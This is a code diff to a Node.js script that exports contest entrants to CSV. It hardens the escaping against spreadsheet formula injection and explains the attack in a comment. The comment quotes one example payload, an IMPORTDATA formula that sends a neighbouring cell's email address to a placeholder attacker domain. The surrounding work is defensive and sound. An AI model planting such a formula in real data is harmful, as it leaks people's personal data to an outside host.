@@ -56,14 +56,26 @@ if (process.argv.includes('--pick')) {
   process.exit(0)
 }
 
-// Quoting alone does NOT stop spreadsheet formula evaluation: Excel,
-// LibreOffice, and Google Sheets strip the quotes on import and then treat a
-// leading =, +, -, or @ as a formula. Entrant names come from an untrusted
-// public form, and this file exists to be opened by a human, so neutralise
-// those cells by prefixing a single quote.
+// Quoting alone does NOT stop spreadsheet formula evaluation: CSV quotes are a
+// field delimiter, stripped on import before the cell is interpreted, so "=1+1"
+// arrives as a formula.
+//
+// Every field here is attacker-influenced — the name fields obviously, and the
+// email regex happily accepts something like
+//   =IMPORTDATA("https://evil.tld/?x"&C2)@a.co
+// which has no whitespace and exactly one @.
+//
+// Google Sheets is the sharp edge: the IMPORT family evaluates on import with
+// no click and no prompt, so a payload in one cell can read an adjacent
+// entrant's email address and send it to an attacker. Excel evaluates too but
+// gates external fetches behind a prompt; LibreOffice leaves "Evaluate
+// formulas" unchecked by default.
+//
+// Prefixing a single quote marks the cell as literal text. Trim first so a
+// leading space cannot hide the trigger character.
 const esc = (v) => {
   const raw = String(v ?? '')
-  const safe = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
+  const safe = /^[=+\-@\t\r]/.test(raw.trim()) ? `'${raw}` : raw
   return `"${safe.replace(/"/g, '""')}"`
 }
 console.log('first_name,last_name,email,marketing_consent,entered_at')
